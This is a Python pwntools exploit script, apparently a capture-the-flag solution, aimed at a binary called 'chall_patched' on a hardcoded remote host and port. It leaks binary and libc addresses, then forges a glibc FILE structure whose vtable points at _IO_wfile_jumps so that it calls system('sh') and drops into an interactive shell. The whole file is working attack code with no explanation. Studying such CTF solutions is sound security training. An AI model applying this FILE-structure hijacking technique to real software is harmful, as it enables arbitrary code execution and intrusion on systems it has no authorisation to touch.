#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x555555555e94
        # brva 0x1E10 
        # dup
        brva 0x01CF1
        # fclose
        b*0x555555555ec6
        b*_IO_wfile_overflow
        brva 0x0183B 
        c
        ''')
        sleep(1)

#  nc 67.223.119.69 9001 
if args.REMOTE:
    p = remote('67.223.119.69', 9001)
else:
    p = process([exe.path])

def edit_operator(op):
    slna(b'> ', 1)
    sla(b'label:\n', op)

def edit_auditor(op):
    slna(b'> ', 2)
    sla(b'label:\n', op)

def import_packet(name):
    sla(b'> ', b'5')
    sla(b'source name: ', name)

def show():
    sla(b'> ', b'3')

# import: 0x5555555583a0
# packet data; 0x5555555583b0

edit_operator(b'a'*0x40)
edit_auditor(b'b'*0x40)
GDB()

show()

ru(b'a'*0x40)
bin_leak = u64(r(6) + b'\0\0')
exe.address = bin_leak- 0x1efb
info(f'bin leak: {hex(bin_leak)}')
info(f'base bin leak: {hex(exe.address)}')

ru(b'b'*0x40)
libc_leak = u64(r(6) + b'\0\0')
libc.address = libc_leak-0x21b780
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

import_packet(b'@console')
s(p16(0x1008))

fake = exe.address+0x43b0


io = FileStructure()
io.flags = 0x3b01010101010101
io._IO_read_ptr = b'sh'
io._IO_write_ptr = exe.address+0x5000
io._IO_write_base = 0
io.chain = libc.sym._IO_2_1_stdout_
io.vtable = libc.sym._IO_wfile_jumps+8
io._lock = libc.sym._IO_stdfile_2_lock
io._wide_data = exe.address +0x4490 # check later


load = flat(
    bytes(io),
    b'\0'*0xe0,
    exe.address+0x4578-0x68,
    libc.sym.system,

).ljust(0x1000, b'\0')

load += p64(fake)

s(load)


p.interactive()
